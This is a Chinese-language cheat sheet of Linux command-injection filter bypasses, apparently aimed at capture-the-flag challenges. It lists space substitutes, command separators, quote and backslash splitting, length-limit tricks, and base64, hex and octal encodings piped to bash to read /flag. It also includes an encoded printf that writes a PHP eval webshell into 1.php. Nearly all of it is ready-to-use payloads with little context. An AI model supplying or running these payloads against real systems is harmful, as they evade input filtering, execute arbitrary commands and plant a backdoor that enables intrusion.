# linux常见绕过姿势
### 绕过关键字过滤

```bash
fla$*g ==> flag
```



### 空格过滤

    < 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS、$IFS$一位数字

### 命令分隔符

    linux中：%0a(换行) 、%0d（回车） 、; 、& 、| 、&&、||
    
    windows中：%0a、&、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符，SUB 在文本文件中表示文件结果）

### 花括号

    {cat,flag} 逗号代替空格

### 黑名单绕过

拼接绕过:$a=l;$b=s;$a$b

编码绕过
base64：
echo MTIzCg==|base64 -d 其将会打印123
echo "Y2F0IC9mbGFn"|base64-d|bash ==>cat /flag

hex:
echo "636174202f666c6167" | xxd -r -p|bash ==>cat /flag

oct：
$(printf "\154\163") ==>ls
$(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==>cat /flag
{printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==>cat /flag
#可以通过这样来写webshell,内容为<?php @eval($_POST['c']);?>
${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php

单引号和双引号绕过
比如：ca' 't flag 或ca" "t flag
反斜杠绕过
比如：ca\t fl\ag
### 长度限制

长度限制可以用文件构造的方式来绕过。
linux下可以用 1>a创建文件名为a的空文件
ls -t>test则会将目录按时间排序后写进test文件中
sh命令可以从一个文件中读取命令来执行

### 内联执行

命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。类似的还有$(command).

    cat$IFS`ls`
    
    cat$IFS$(ls)
